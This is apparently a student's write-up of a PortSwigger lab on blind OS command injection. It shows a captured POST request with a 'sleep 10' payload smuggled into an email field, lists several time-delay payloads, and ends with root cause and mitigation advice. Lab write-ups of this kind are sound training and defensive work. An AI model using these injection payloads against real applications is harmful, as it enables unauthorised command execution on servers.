# Lab Report: Blind OS Command Injection (Time Delays)

## Overview
This lab from **PortSwigger / Web Security Academy** demonstrates a **blind OS command injection** vulnerability where injected commands do **not** return visible output, but their execution can be confirmed using **time-based side channels** (delays).

**Lab Goal:**  
- Confirm command execution by injecting time-delay payloads (e.g. `sleep 10`) into a vulnerable input and observing increased response time.  
- Use the timing side-channel to prove the application runs injected shell commands.

---

## Environment & Tools
- Target: lab instance hosted at Web Security Academy (example host shown in screenshots).  
- Tools used: Burp Suite (Proxy + Repeater), browser, optional `curl`/`time` for timing checks.  

---

## Vulnerability Summary
The application accepts user input (a feedback form) and uses it in a backend system command without sufficient sanitization. Because the application does not return command stdout to the user, this is a *blind* command injection. We confirm execution by injecting commands that create a measurable delay (e.g. `sleep 10`) and comparing request timings.

---

## Steps to Exploitation (what I did)

1. **Locate the vulnerable functionality**
   - Found a feedback form that issues a POST request to `/feedback/submit`.  
   - Fields include `csrf`, `name`, `email`, `subject`, `message`.

2. **Intercept the request**
   - Routed browser traffic through Burp Proxy and captured the POST to `/feedback/submit` (content-type `application/x-www-form-urlencoded`).

3. **Test for time-based blind injection**
   - Injected a delay payload into a field that looked likely to reach shell execution (in my case: `email`).
   - Example URL-encoded injection used in the request body:
     ```
     email=Rumana%40gmail.com%3B%20sleep+10%3B
     ```
     which decodes to:
     ```
     Rumana@gmail.com; sleep 10;
     ```

4. **Send the modified request and observe timing**
   - Forwarded the request and observed the server response in Burp.
   - The server returned `HTTP/2 500 Internal Server Error` with body `"Could not save"`, but the response was delayed by ~10 seconds compared to a control request — confirming that `sleep 10` executed on the server.


---

## Example Payloads (time-delay)

- Unix-like systems:
  - `; sleep 10;`
  - `|| sleep 10`
  - `; if [ "$(id -u)" = "0" ]; then sleep 10; fi;` — conditional delay (example)

- Command-substitution (context dependent):
  - `$(sleep 10)`


## Observed Response (excerpt)

```
POST /feedback/submit HTTP/2
Host: 0af8006903efd585811707cc003b0054.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=Rsaf...&name=Rumana&email=Rumana%40gmail.com%3B%20sleep+10%3B&subject=Nothing&message=Hi
```

_Response time was ~10 seconds longer than the baseline request._

---

## Root Cause
- User input is concatenated directly into a shell command or passed to a system shell without proper sanitization or escaping.  
- The application lacks strict validation (e.g., ensuring `email` contains only valid characters) and therefore allows shell metacharacters to alter command flow.

---

## Impact
- Since the application executes arbitrary shell commands provided (or influenced) by user input, an attacker can perform arbitrary OS commands, exfiltrate data, or pivot — depending on privileges and environment.  
- In blind scenarios, attackers can use time delays to extract secrets bit-by-bit (very slow) or to confirm code execution.

---

## Mitigation Recommendations

1. **Input Validation & Whitelisting**  
   - Validate inputs server-side. For fields such as email or numeric IDs, allow only the characters required (regex/email parser or numeric checks).

2. **Avoid Shell Invocation with User Input**  
   - Use language-native APIs that accept argument arrays (e.g. `execv`/`ProcessBuilder`) instead of building shell strings. Avoid `system()` or `sh -c` with concatenated input.

3. **Proper Escaping / Sanitization**  
   - If shell invocation is absolutely required, escape/encode user input properly with safe libraries and do not allow shell metacharacters.

4. **Least Privilege Execution**  
   - Run services under restricted accounts with minimal filesystem and network access. Reduce impact of successful exploitation.

5. **WAF & Runtime Protections**  
   - Use WAF rules to block obvious exploit patterns (shell characters in fields that should be simple) and runtime monitoring to catch anomalous delays or command-like input.

6. **Logging & Monitoring**  
   - Log suspicious input and high-latency requests; alert on patterns consistent with blind extraction attempts.

---


## Evidence (screenshots)
- `Code-Injection-Lab2-backend.jpg` — Burp capture showing the injected `sleep+10` payload in the POST body and the server response.  
- `Code-Injection-Lab2.jpg` — Lab completion screenshot showing the “Congratulations, you solved the lab!” banner.

![Code-Injection-Lab2-backend.jpg](/images/Code-Injection-Lab2-backend.jpg)  
![Code-Injection-Lab2.jpg](/images/Code-Injection-Lab2.jpg)  

---

## Skills Demonstrated
- Intercepting and modifying HTTP requests with Burp Suite.  
- Crafting time-delay payloads to confirm blind command injection.  
- Analysing server responses and response timing for vulnerability confirmation.  
- Understanding of secure coding practices and mitigation strategies.

---

## References
- [PortSwigger Lab: OS Command Injection, Simple Case](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

---

*End of report.*
